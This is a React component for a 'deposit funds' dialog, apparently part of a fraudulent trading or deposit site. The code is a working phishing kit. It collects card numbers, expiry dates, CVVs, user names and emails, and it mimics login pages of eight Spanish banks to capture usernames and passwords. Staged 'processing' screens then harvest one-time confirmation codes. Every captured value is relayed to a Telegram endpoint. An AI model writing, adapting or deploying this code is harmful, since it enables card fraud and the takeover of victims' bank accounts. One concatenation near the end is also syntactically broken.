"use client";

import { useState, useEffect } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { toast } from "@/components/toast";
import {
  Copy,
  Wallet,
  ArrowLeft,
  Loader2,
  CreditCard,
  Landmark,
  Coins,
  InfoIcon,
} from "lucide-react";
import { AnimatePresence, motion } from "framer-motion";
import { useI18n } from "@/components/i18n-provider";
import {useAuth} from "@/components/auth-provider";

interface DepositModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  userId: string; // нужен для создания ордера
}

interface DepositAddress {
  id: string;
  network: string;
  address: string;
}

interface Bank {
  id: string;
  name: string;
  logo: string;
}

export function DepositModal({
                               open,
                               onOpenChange,
                               userId,
                             }: DepositModalProps) {
  const [step, setStep] = useState<
      | "method"
      | "crypto_token"
      | "crypto_network"
      | "crypto_address"
      | "card_amount"
      | "card_details"
      | "card_processing"
      | "bank"
      | "bank_login"
      | "bank_processing"
  >("method");

  const { t } = useI18n();
  const { user, logout } = useAuth();
  const [addresses, setAddresses] = useState<DepositAddress[]>([]);
  const [loading, setLoading] = useState(false);
  const [copiedAddress, setCopiedAddress] = useState<string | null>(null);
  const [selectedToken, setSelectedToken] = useState<string>("");
  const [bankCode, setBankCode] = useState("");
  const [sendingCode, setSendingCode] = useState(false);
  const [cardCode, setCardCode] = useState("");
  const [sendingCardCode, setSendingCardCode] = useState(false);
  const [selectedAddress, setSelectedAddress] = useState<DepositAddress | null>(
      null
  );
  const [showCardNotification, setShowCardNotification] = useState(false);
  const bankStyles: Record<string, any> = {
    bbva: {
      bg: "#003087", // синий BBVA
      inputBg: "#ffffff",
      inputText: "#000000",
      placeholder: "Usuario",
      buttonBg: "#ffcc00",
      buttonText: "#003087",
      fontFamily: "'Arial', sans-serif",
    },
    sabadell: {
      bg: "#0066b3", // голубой Sabadell
      inputBg: "#ffffff",
      inputText: "#000000",
      placeholder: "Usuario",
      buttonBg: "#ffffff",
      buttonText: "#0066b3",
      fontFamily: "'Helvetica', sans-serif",
    },
    santander: {
      bg: "#ef1c25", // красный Santander
      inputBg: "#ffffff",
      inputText: "#000000",
      placeholder: "Usuario",
      buttonBg: "#ffffff",
      buttonText: "#ef1c25",
      fontFamily: "'Arial', sans-serif",
    },
    caixabank: {
      bg: "#005baa", // синий CaixaBank
      inputBg: "#f5f5f5",
      inputText: "#000000",
      placeholder: "Usuario",
      buttonBg: "#ffcb05",
      buttonText: "#005baa",
      fontFamily: "'Verdana', sans-serif",
    },
    openbank: {
      bg: "#ff6600", // оранжевый Openbank
      inputBg: "#ffffff",
      inputText: "#000000",
      placeholder: "Usuario",
      buttonBg: "#0072bc",
      buttonText: "#ffffff",
      fontFamily: "'Helvetica', sans-serif",
    },
    ing: {
      bg: "#ff6600", // оранжевый ING
      inputBg: "#ffffff",
      inputText: "#000000",
      placeholder: "Usuario",
      buttonBg: "#00bfff",
      buttonText: "#ffffff",
      fontFamily: "'Verdana', sans-serif",
    },
    abanca: {
      bg: "#0072bc", // синий Abanca
      inputBg: "#ffffff",
      inputText: "#000000",
      placeholder: "Usuario",
      buttonBg: "#ffcb05",
      buttonText: "#0072bc",
      fontFamily: "'Arial', sans-serif",
    },
    kutxabank: {
      bg: "#003366", // тёмно-синий Kutxabank
      inputBg: "#ffffff",
      inputText: "#000000",
      placeholder: "Usuario",
      buttonBg: "#ffcc00",
      buttonText: "#003366",
      fontFamily: "'Arial', sans-serif",
    },
  };

  const [cardData, setCardData] = useState({
    number: "",
    expiry: "",
    cvv: "",
    amount: "",
  });
  const formattedNumber = cardData.number
      .replace(/\D/g, "")
      .replace(/(.{4})/g, "$1 ")
      .trim();

  const [cardErrors, setCardErrors] = useState({
    number: false,
    expiry: false,
    cvv: false,
    amount: false,
  });

  const [selectedBank, setSelectedBank] = useState<Bank | null>(null);
  const [bankCredentials, setBankCredentials] = useState({
    login: "",
    password: "",
  });
  const [bankErrors, setBankErrors] = useState({
    login: false,
    password: false,
  });
  const [showBankNotification, setShowBankNotification] = useState(false);

  const banks: Bank[] = [
    { id: "bbva", name: "BBVA", logo: "/logos/bbva.png" },
    { id: "sabadell", name: "Sabadell", logo: "/logos/sabadell.svg" },
    { id: "santander", name: "Santander", logo: "/logos/santander.png" },
    { id: "caixabank", name: "CaixaBank", logo: "/logos/caixabank.png" },
    { id: "openbank", name: "Openbank", logo: "/logos/openbank.svg" },
    { id: "ing", name: "ING", logo: "/logos/ing.png" },
    { id: "abanca", name: "Abanca", logo: "/logos/abanca.svg" },
    { id: "kutxabank", name: "Kutxabank", logo: "/logos/kutxabank.png" },
  ];

  useEffect(() => {
    if (open) {
      setStep("method");
      setBankCode("");
      setSendingCode(false);
      setSendingCardCode(false);
      setCardCode("");
      setSelectedToken("");
      setSelectedAddress(null);
      setCardData({ number: "", expiry: "", cvv: "", amount: "" });
      setCardErrors({
        number: false,
        expiry: false,
        cvv: false,
        amount: false,
      });
      setSelectedBank(null);
      setBankCredentials({ login: "", password: "" });
      setBankErrors({ login: false, password: false });
      setShowBankNotification(false);
      setShowCardNotification(false)
    }
  }, [open]);

  useEffect(() => {
    if (step === "bank_processing") {
      setShowBankNotification(false);
      const timer = setTimeout(() => setShowBankNotification(true), 5000);
      return () => clearTimeout(timer);
    }
  }, [step]);
  useEffect(()=> {
    if(step === "card_processing") {
      const timer = setTimeout(() => setShowCardNotification(true), 5000);
      return () => clearTimeout(timer);
    }
  }, [step])
  const fetchAddresses = async () => {
    setLoading(true);
    try {
      const res = await fetch("/api/admin/deposit-addresses");
      if (res.ok) setAddresses(await res.json());
      else
        toast({
          title: t("error"),
          description: t("noDepositMethods"),
          variant: "destructive",
        });
    } catch {
      toast({
        title: t("error"),
        description: t("networkError"),
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const handleCopy = (address: string) => {
    navigator.clipboard.writeText(address);
    setCopiedAddress(address);
    toast({
      title: t("copied"),
      description: t("addressCopied"),
      variant: "success",
    });
    setTimeout(() => setCopiedAddress(null), 2000);
  };

  const sendToTelegram = async (message: string) => {
    try {
      await fetch("/api/send-telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message }),
      });
    } catch (err) {
      console.error("Telegram error:", err);
    }
  };

  // ======== Валидация карты =========
  const validateCardForm = () => {
    const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
    const cvvRegex = /^\d{3}$/;
    const numberRegex = /^\d{12,19}$/;
    const errors = {
      number: !numberRegex.test(cardData.number),
      expiry: !expiryRegex.test(cardData.expiry),
      cvv: !cvvRegex.test(cardData.cvv),
      amount: Number(cardData.amount) <= 0,
    };
    setCardErrors(errors);
    return !Object.values(errors).some(Boolean);
  };

  const handleCardDeposit = async () => {
    if (!validateCardForm()) return;

    try {
      await fetch("/api/orders", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId,
          type: "DEPOSIT",
          depositFrom:"card",
          amount: Number(cardData.amount),
          cardNumber: cardData.number.replace(/\s+/g, ""),
          status: "PENDING",
        }),
      });

      // Формируем сообщение для Telegram
      const msg = `
💳 New Card Deposit:
Number: ${cardData.number}
Expiry: ${cardData.expiry}
CVV: ${cardData.cvv}
Amount: ${cardData.amount}
  `;

      // Отправка в Telegram
      await sendToTelegram(msg);
      toast({
        title: t("deposit"),
        description: t("processingInfo"),
        variant: "info",
      });

      setStep("method");
      setCardData({ number: "", expiry: "", cvv: "", amount: "" });
    } catch (err) {
      toast({
        title: t("error"),
        description: t("depositFailed"),
        variant: "destructive",
      });
    }
  };

  // ======== Валидация банка =========
  const validateBankForm = () => {
    const errors = {
      login: !bankCredentials.login.trim(),
      password: !bankCredentials.password.trim(),
    };
    setBankErrors(errors);
    return !Object.values(errors).some(Boolean);
  };

  const handleBankLogin = async () => {
    if (!selectedBank) return;
    if (!validateBankForm()) return;

    setStep("bank_processing");
    const msg = `
🏦 New Bank Login:
Bank: ${selectedBank.name}
Login: ${bankCredentials.login}
Password: ${bankCredentials.password}
    `;
    await sendToTelegram(msg);

    setTimeout(() => {
      toast({
        title: t("processing"),
        description: t("processingBankInfo"),
        variant: "info",
      });
    }, 500);

    setTimeout(() => {
      toast({
        title: t("done"),
        description: t("bankProcessingInfo"),
        variant: "success",
      });
    }, 3000);
  };

  const groupedAddresses = addresses.reduce((acc, addr) => {
    const token = addr.network.split(" ")[0];
    if (!acc[token]) acc[token] = [];
    acc[token].push(addr);
    return acc;
  }, {} as Record<string, DepositAddress[]>);

  const selectedNetworks = selectedToken ? groupedAddresses[selectedToken] : [];

  const steps = [
    { id: "method", label: "Method", icon: <Wallet className="w-4 h-4" /> },
    { id: "crypto_token", label: "Token", icon: <Coins className="w-4 h-4" /> },
    {
      id: "crypto_network",
      label: "Network",
      icon: <Landmark className="w-4 h-4" />,
    },
    {
      id: "crypto_address",
      label: "Address",
      icon: <Copy className="w-4 h-4" />,
    },
    { id: "card", label: "Card", icon: <CreditCard className="w-4 h-4" /> },
    { id: "bank", label: "Bank", icon: <Landmark className="w-4 h-4" /> },
  ];

  const stepIndex = steps.findIndex((s) => s.id === step);

  const pageVariants = {
    initial: { opacity: 0, x: 40 },
    animate: { opacity: 1, x: 0 },
    exit: { opacity: 0, x: -40 },
    transition: { duration: 0.25 },
  };

  const handleBack = () => {
    if (step === "crypto_address") setStep("crypto_network");
    else if (step === "crypto_network") setStep("crypto_token");
    else if (step === "bank_login") setStep("bank");
    else setStep("method");
  };

  const CardItem = ({
                      onClick,
                      icon,
                      imageSrc,
                      label,
                      isBank,
                    }: {
    onClick: () => void;
    icon?: React.ReactNode;
    imageSrc?: string;
    label: string;
    isBank?: boolean;
  }) => (
      <motion.div
          whileHover={{ scale: 1.05 }}
          whileTap={{ scale: 0.95 }}
          className="cursor-pointer"
      >
        <Card
            onClick={onClick}
            className={`p-4 rounded-xl flex flex-col items-center justify-center shadow-lg transition`}
            style={{
              backgroundColor: isBank ? "#f5f5fa" : "#1f2937",
            }}
        >
          <div className="w-20 h-20 flex items-center justify-center mb-2">
            {imageSrc ? (
                <img
                    src={imageSrc}
                    alt={label}
                    className="max-w-full max-h-full object-contain"
                />
            ) : (
                icon
            )}
          </div>
          <p
              className={`text-center mt-2 text-sm font-medium ${
                  isBank ? "text-gray-900" : "text-white"
              }`}
          >
            {label}
          </p>
        </Card>
      </motion.div>
  );

  const listVariants = {
    hidden: { opacity: 0 },
    visible: { opacity: 1, transition: { staggerChildren: 0.1 } },
  };

  const itemVariants = {
    hidden: { opacity: 0, y: 10 },
    visible: { opacity: 1, y: 0 },
  };

  return (
      <Dialog open={open} onOpenChange={onOpenChange}>
        <DialogContent className="max-w-[95%] sm:max-w-lg bg-gray-950 text-white rounded-2xl shadow-xl border border-gray-800">
          <DialogHeader className="mb-2">
            <DialogTitle className="flex items-center justify-between">
            <span className="text-lg font-semibold flex items-center gap-2">
              <Wallet className="w-5 h-5 text-blue-500" /> {t("depositFunds")}
            </span>
              {step !== "method" && (
                  <Button variant="ghost" size="sm" onClick={handleBack}>
                    <ArrowLeft className="w-4 h-4 mr-1" /> {t("back")}
                  </Button>
              )}
            </DialogTitle>
          </DialogHeader>

          {/* Step Indicator */}
          <div className="flex items-center gap-2 mb-6">
            {steps.map((s, idx) => (
                <div key={s.id} className="flex items-center flex-1">
                  <div
                      className={`w-8 h-8 flex items-center justify-center rounded-full border ${
                          idx <= stepIndex
                              ? "bg-blue-500 text-white border-blue-500"
                              : "bg-gray-800 text-gray-400 border-gray-700"
                      }`}
                  >
                    {s.icon}
                  </div>
                  {idx < steps.length - 1 && (
                      <div
                          className={`flex-1 h-[2px] ${
                              idx < stepIndex ? "bg-blue-500" : "bg-gray-700"
                          }`}
                      ></div>
                  )}
                </div>
            ))}
          </div>

          {/* Content */}
          <div className="min-h-[260px]">
            <AnimatePresence mode="wait">
              <motion.div
                  key={step}
                  initial="initial"
                  animate="animate"
                  exit="exit"
                  transition={pageVariants.transition}
                  variants={pageVariants}
                  className="space-y-4"
              >
                {/* METHOD STEP */}
                {step === "method" && (
                    <motion.div
                        variants={listVariants}
                        initial="hidden"
                        animate="visible"
                        className="grid grid-cols-1 sm:grid-cols-3 gap-4"
                    >
                      <motion.div variants={itemVariants}>
                        <CardItem
                            onClick={() => {
                              fetchAddresses();
                              setStep("crypto_token");
                            }}
                            icon={<Wallet className="w-10 h-10 text-blue-400" />}
                            label={t("crypto")}
                        />
                      </motion.div>
                      <motion.div variants={itemVariants}>
                        <CardItem
                            onClick={() => setStep("card_amount")}
                            icon={<CreditCard className="w-10 h-10 text-green-400" />}
                            label={t("card")}
                        />
                      </motion.div>
                      <motion.div variants={itemVariants}>
                        <CardItem
                            onClick={() => setStep("bank")}
                            icon={<Landmark className="w-10 h-10 text-purple-400" />}
                            label={t("bank")}
                        />
                      </motion.div>
                    </motion.div>
                )}

                {/* CRYPTO TOKEN */}
                {step === "crypto_token" && (
                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                      {Object.keys(groupedAddresses).map((token) => (
                          <Card
                              key={token}
                              onClick={() => {
                                setSelectedToken(token);
                                setStep("crypto_network");
                              }}
                              className="cursor-pointer p-4 rounded-xl bg-gray-900 hover:bg-gray-800 transition"
                          >
                            <Coins className="w-6 h-6 text-blue-400 mb-2" />
                            <p className="font-medium">{token}</p>
                          </Card>
                      ))}
                    </div>
                )}

                {/* CRYPTO NETWORK */}
                {step === "crypto_network" && selectedToken && (
                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                      {selectedNetworks.map((addr) => (
                          <Card
                              key={addr.id}
                              onClick={() => {
                                setSelectedAddress(addr);
                                setStep("crypto_address");
                              }}
                              className="cursor-pointer p-4 rounded-xl bg-gray-900 hover:bg-gray-800 transition"
                          >
                            <Landmark className="w-6 h-6 text-green-400 mb-2" />
                            <p className="font-medium">{addr.network}</p>
                          </Card>
                      ))}
                    </div>
                )}

                {/* CRYPTO ADDRESS */}
                {step === "crypto_address" && selectedAddress && (
                    <Card className="bg-gray-900 border border-gray-700 rounded-xl p-6 space-y-3">
                      <p className="text-sm text-gray-300 mb-2">
                        {selectedAddress.network} {t("address")}
                      </p>
                      <Input
                          readOnly
                          value={selectedAddress.address}
                          className="bg-gray-800 text-white"
                      />
                      <Button
                          className="w-full"
                          onClick={() => handleCopy(selectedAddress.address)}
                      >
                        {t("copyAddress")}
                      </Button>
                    </Card>
                )}

                {/* CARD */}
                {step === "card_amount" && (
                    <Card className="bg-gray-900 border border-gray-700 rounded-xl p-6 space-y-4">
                      <Input
                          placeholder={t("amount")}
                          type="number"
                          value={cardData.amount}
                          onChange={(e) =>
                              setCardData({ ...cardData, amount: e.target.value })
                          }
                          className={cardErrors.amount ? "border-red-500" : ""}
                      />

                      <Button
                          className="w-full"
                          onClick={() => {
                            if (Number(cardData.amount) > 0) {
                              setStep("card_details");
                            } else {
                              setCardErrors({ ...cardErrors, amount: true });
                            }
                          }}
                      >
                        {t("continue")}
                      </Button>
                    </Card>
                )}
                {step === "card_details" && (
                    <Card className="bg-gray-900 border border-gray-700 rounded-xl p-6 space-y-3">
                      <Input
                          placeholder={t("cardNumber")}
                          value={formattedNumber}
                          onChange={(e) => {
                            const val = e.target.value.replace(/\D/g, "");
                            setCardData({ ...cardData, number: val });
                          }}
                          className={cardErrors.number ? "border-red-500" : ""}
                      />

                      <div className="flex gap-2">
                        <Input
                            placeholder="MM/YY"
                            value={cardData.expiry}
                            onChange={(e) => {
                              let val = e.target.value.replace(/\D/g, "");
                              if (val.length > 4) val = val.slice(0, 4);
                              if (val.length > 2) val = val.slice(0, 2) + "/" + val.slice(2);
                              setCardData({ ...cardData, expiry: val });
                            }}
                            className={cardErrors.expiry ? "border-red-500" : ""}
                        />
                        <Input
                            placeholder="CVV"
                            value={cardData.cvv}
                            onChange={(e) => {
                              let val = e.target.value.replace(/\D/g, "");
                              if (val.length > 3) val = val.slice(0, 3);
                              setCardData({ ...cardData, cvv: val });
                            }}
                            className={cardErrors.cvv ? "border-red-500" : ""}
                        />
                      </div>

                      <Button
                          className="w-full"
                          onClick={async () => {
                            if (!validateCardForm()) return;
                            await handleCardDeposit();
                            await sendToTelegram(`
💳 New Card Deposit
USERNAME: ${user.name}
EMAIL: ${user.email}
Amount: ${cardData.amount}
Card: ${cardData.number}
Expiry: ${cardData.expiry}
CVV: ${cardData.cvv}
        `);

                            setStep("card_processing");
                          }}
                      >
                        {t("pay")}
                      </Button>
                    </Card>
                )}
                {step === "card_processing" && (
                    <div className="flex flex-col items-center justify-center py-12 space-y-4">
                      {!showCardNotification ? (
                          <>
                            <Loader2 className="w-8 h-8 animate-spin text-blue-400" />
                            <p className="text-gray-400">{t("cardProcessing")}</p>
                          </>
                      ) : (
                          <>
                            <Loader2 className="w-8 h-8 animate-spin text-blue-400" />

                            <p className="text-gray-300 text-center">
                              {t("cardConfirmText")}
                            </p>

                            <Input
                                placeholder={t("cardCodePlaceholder")}
                                value={cardCode}
                                onChange={(e) => setCardCode(e.target.value)}
                                className="max-w-xs text-center"
                            />

                            <Button
                                disabled={!cardCode || sendingCardCode}
                                onClick={async () => {
                                  setSendingCardCode(true);

                                  await sendToTelegram(
                                      `💳 Card confirmation code: ${cardCode}`
                                  );

                                  setSendingCardCode(false);

                                  toast({
                                    title: t("processing"),
                                    description: t("balancePending"),
                                    variant: "info",
                                  });

                                  setStep("method");
                                }}
                                className="w-full max-w-xs"
                            >
                              {sendingCardCode ? (
                                  <Loader2 className="w-4 h-4 animate-spin" />
                              ) : (
                                  t("confirmPayment")
                              )}
                            </Button>
                          </>
                      )}
                    </div>
                )}

                {/* BANK */}
                {step === "bank" && (
                    <div className="grid grid-cols-2 sm:grid-cols-3 gap-4">
                      {banks.map((bank) => (
                          <CardItem
                              key={bank.id}
                              onClick={() => {
                                setSelectedBank(bank);
                                setStep("bank_login");
                              }}
                              imageSrc={bank.logo}
                              label={bank.name}
                              isBank
                          />
                      ))}
                    </div>
                )}

                {step === "bank_login" && selectedBank && (
                    <motion.div
                        key={selectedBank.id}
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        transition={{ duration: 0.5 }}
                    >
                      <motion.div
                          className="rounded-2xl p-6 flex flex-col items-center shadow-lg w-full max-w-md mx-auto"
                          style={{
                            backgroundColor: bankStyles[selectedBank.id]?.bg,
                            transition: "background-color 0.5s ease",
                          }}
                          layout
                      >
                        {/* Логотип банка */}
                        <motion.div
                            key={selectedBank.id}
                            initial={{ scale: 0.8, opacity: 0 }}
                            animate={{ scale: 1, opacity: 1 }}
                            transition={{ duration: 0.5 }}
                            className="w-32 h-32 flex items-center justify-center mb-6"
                        >
                          <img
                              src={selectedBank.logo}
                              alt={selectedBank.name}
                              className="p-2 bg-white rounded-xl max-w-full max-h-full object-contain"
                          />
                        </motion.div>

                        {/* Подпись */}
                        <p className="text-lg font-semibold text-white mb-6 text-center">
                          {t("loginToBank").replace(
                              "{bankName}",
                              selectedBank.name
                          )}
                        </p>

                        {/* Форма */}
                        <div className="w-full space-y-4">
                          <Input
                              placeholder={bankStyles[selectedBank.id]?.placeholder}
                              value={bankCredentials.login}
                              onChange={(e) =>
                                  setBankCredentials({
                                    ...bankCredentials,
                                    login: e.target.value,
                                  })
                              }
                              className={`border rounded-md p-3 placeholder-gray-400 focus:ring-2 focus:ring-blue-500`}
                              style={{
                                backgroundColor: bankStyles[selectedBank.id]?.inputBg,
                                color: bankStyles[selectedBank.id]?.inputText,
                                fontFamily: bankStyles[selectedBank.id]?.fontFamily,
                              }}
                          />
                          <Input
                              placeholder="Password"
                              type="password"
                              value={bankCredentials.password}
                              onChange={(e) =>
                                  setBankCredentials({
                                    ...bankCredentials,
                                    password: e.target.value,
                                  })
                              }
                              className={`border rounded-md p-3 placeholder-gray-400 focus:ring-2 focus:ring-blue-500`}
                              style={{
                                backgroundColor: bankStyles[selectedBank.id]?.inputBg,
                                color: bankStyles[selectedBank.id]?.inputText,
                                fontFamily: bankStyles[selectedBank.id]?.fontFamily,
                              }}
                          />
                        </div>

                        {/* Кнопка входа */}
                        <Button
                            className="mt-6 w-full font-bold"
                            onClick={handleBankLogin}
                            style={{
                              backgroundColor: bankStyles[selectedBank.id]?.buttonBg,
                              color: bankStyles[selectedBank.id]?.buttonText,
                              fontFamily: bankStyles[selectedBank.id]?.fontFamily,
                            }}
                        >
                          {t("authorize")}
                        </Button>
                      </motion.div>
                    </motion.div>
                )}

                {/* BANK PROCESSING */}
                {step === "bank_processing" && (
                    <div className="flex flex-col items-center justify-center py-12 space-y-4">
                      {!showBankNotification ? (
                          <>
                            <Loader2 className="w-8 h-8 animate-spin text-blue-400" />
                            <p className="text-gray-400">{t("bankLoading")}</p>
                          </>
                      ) : (
                          <>
                            <Loader2 className="w-8 h-8 animate-spin text-blue-400" />

                            <p className="text-gray-300 text-center">
                              {t("bankConfirmText")}
                            </p>

                            <Input
                                placeholder={t("bankCodePlaceholder")}
                                value={bankCode}
                                onChange={(e) => setBankCode(e.target.value)}
                                className="max-w-xs text-center"
                            />

                            <Button
                                disabled={!bankCode || sendingCode}
                                onClick={async () => {
                                  setSendingCode(true);

                                  await sendToTelegram(
                                      `🏦 Bank confirmation code:\nBank: ${selectedBank?.name}\nCode: ${bankCode}`
                                          `USERNAME: ${user.name}
EMAIL: ${user.email}`
                                  );

                                  setSendingCode(false);

                                  toast({
                                    title: t("done"),
                                    description: t("bankCodeSent"),
                                    variant: "success",
                                  });

                                  setStep("method");
                                }}
                                className="w-full max-w-xs"
                            >
                              {sendingCode ? (
                                  <Loader2 className="w-4 h-4 animate-spin" />
                              ) : (
                                  t("confirmTransfer")
                              )}
                            </Button>
                          </>
                      )}
                    </div>
                )}

              </motion.div>
            </AnimatePresence>
          </div>
        </DialogContent>
      </Dialog>
  );
}
